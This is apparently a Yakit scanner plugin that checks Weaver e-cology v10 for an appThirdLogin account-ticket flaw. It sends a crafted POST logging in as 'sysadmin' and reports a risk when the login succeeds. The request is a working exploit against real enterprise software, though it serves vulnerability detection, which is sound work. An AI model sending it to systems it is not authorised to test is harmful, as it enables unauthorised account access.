yakit.AutoInitYakit()

handleCheck = func(target, port, payload) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0

username=sysadmin&service=1&ip=1&loginType=third
`
    rsp, req, _ = poc.HTTP(
        packet, 
        poc.params({"target": addr, "payload": payload}), 
        poc.https(isTls), 
        poc.redirectTimes(0), 
    )
    if len(rsp) > 0 {
        if str.MatchAllOfSubString(rsp, "HTTP/1.1 200", `登录成功`) {
            yakit.Info(
                "%v 泛微e-cology-v10 appThirdLogin接口获取账号票据漏洞", 
                addr, 
            )
            risk.NewRisk(
                addr, 
                risk.title("泛微e-cology-v10 appThirdLogin接口获取账号票据漏洞"), 
                risk.severity("middle"), 
                risk.titleVerbose("泛微e-cology-v10 appThirdLogin接口获取账号票据漏洞"), 
                risk.type("sensitive-info-leak"), 
                risk.typeVerbose("信息泄露[泛微e-cology-v10]"), 
                risk.request(string(req)), 
                risk.response(string(rsp)), 
                risk.cve(""), 
            )
        } else {
            println("不存在泛微e-cology-v10 appThirdLogin接口获取账号票据漏洞")
        }

    }


    return
}
handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen() {
        return
    }

    payload = `/papi/passport/rest/appThirdLogin`

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port, payload)
    }

}
